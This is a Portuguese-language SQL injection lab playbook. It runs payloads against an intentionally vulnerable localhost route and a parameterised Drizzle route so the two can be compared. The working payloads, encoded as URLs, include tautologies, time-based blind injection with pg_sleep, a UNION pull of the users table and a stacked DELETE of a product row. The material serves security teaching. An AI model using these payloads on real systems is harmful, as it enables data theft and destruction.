# SQL Injection Playbook (Filtering)

Checklist em ordem de impacto (baixo -> alto), comparando as duas rotas:
- Rota segura (Drizzle parametrizado): `/filtering/no-validation`
- Rota laboratorio insegura (SQL concatenado): `/filtering/unsafe-lab`

## Base local
Use `localhost:3000`.

## Pre-requisitos do laboratorio inseguro
No `.env`:
- `NODE_ENV=development`
- `ENABLE_UNSAFE_SQL_LAB=true`

## 1) Baseline (sem ataque)
Esperado: poucos resultados coerentes.

http://localhost:3000/filtering/no-validation?name=Product%2000001
http://localhost:3000/filtering/unsafe-lab?name=Product%2000001&debugSql=1

## 2) Quebra simples de aspas
Payload: `name='`
Esperado em codigo vulneravel: erro de sintaxe SQL.

http://localhost:3000/filtering/no-validation?name=%27
http://localhost:3000/filtering/unsafe-lab?name=%27&debugSql=1

## 3) Tautologia texto
Payload: `name=' OR '1'='1' --`
Esperado em codigo vulneravel: muito mais linhas que o baseline.

Sobre seu comentario do `--`:
- O `--` inicia comentario SQL e ignora o resto da linha.
- Aqui ele evita que o restante da query (incluindo a aspas final gerada pelo backend) quebre a injecao.

http://localhost:3000/filtering/no-validation?name=%27%20OR%20%271%27%3D%271%27%20--
http://localhost:3000/filtering/unsafe-lab?name=%27%20OR%20%271%27%3D%271%27%20--&debugSql=1

## 4) Tautologia numerica
Payload: `id=1 OR 1=1`
Esperado em codigo vulneravel: muitas linhas mesmo filtrando por id.

http://localhost:3000/filtering/no-validation?id=1%20OR%201%3D1
http://localhost:3000/filtering/unsafe-lab?id=1%20OR%201%3D1&debugSql=1

## 5) Fecha string + comentario
Payload: `nameEq=test' --`
Esperado em codigo vulneravel: filtros seguintes podem ser ignorados.

http://localhost:3000/filtering/no-validation?nameEq=test%27%20--
http://localhost:3000/filtering/unsafe-lab?nameEq=test%27%20--&debugSql=1

## 6) Blind SQLi por tempo (corrigido)
Seu erro foi esperado neste payload: `argument of AND must be type boolean, not type void`.
Motivo: `pg_sleep(3)` retorna `void`, nao booleano, entao nao pode entrar direto em `AND`.

Versao funcional para rota insegura (stacked query):
http://localhost:3000/filtering/unsafe-lab?name=%27%3B%20SELECT%20pg_sleep%283%29%3B%20--&debugSql=1

Comparacao na rota segura:
http://localhost:3000/filtering/no-validation?name=%27%3B%20SELECT%20pg_sleep%283%29%3B%20--

## 7) UNION com users (pedido aplicado)
Objetivo: puxar dados da tabela `users` com tipos compativeis com o select de `products`.

http://localhost:3000/filtering/unsafe-lab?name=%27%20UNION%20SELECT%20id%2C%20created_at%2C%20name%2C%200%3A%3Anumeric%2C%20%27AVAILABLE%27%3A%3Aproduct_status%20FROM%20users%20--&debugSql=1

Comparacao na rota segura:
http://localhost:3000/filtering/no-validation?name=%27%20UNION%20SELECT%20id%2C%20created_at%2C%20name%2C%200%3A%3Anumeric%2C%20%27AVAILABLE%27%3A%3Aproduct_status%20FROM%20users%20--

## 8) Caso destrutivo (pedido aplicado)
Alvo: remover produto `id = 2` via stacked query.

Versao irreversivel:
http://localhost:3000/filtering/unsafe-lab?name=%27%3B%20DELETE%20FROM%20products%20WHERE%20id%20%3D%202%3B%20--&debugSql=1

Versao segura para demonstracao (faz rollback):
http://localhost:3000/filtering/unsafe-lab?name=%27%3B%20BEGIN%3B%20DELETE%20FROM%20products%20WHERE%20id%20%3D%202%3B%20ROLLBACK%3B%20--&debugSql=1

Comparacao na rota segura:
http://localhost:3000/filtering/no-validation?name=%27%3B%20DELETE%20FROM%20products%20WHERE%20id%20%3D%202%3B%20--

## O que observar
- Compare contagem de linhas com o baseline.
- Observe erros `500` e mensagens do banco.
- Meca tempo de resposta no teste de delay.
- Guarde request/response para evidencias.

## Nota deste projeto
- `no-validation` usa query builder do Drizzle (`eq`, `like`, `and`) e tende a ser parametrizado.
- `unsafe-lab` concatena SQL de forma intencional para demonstracao de risco.
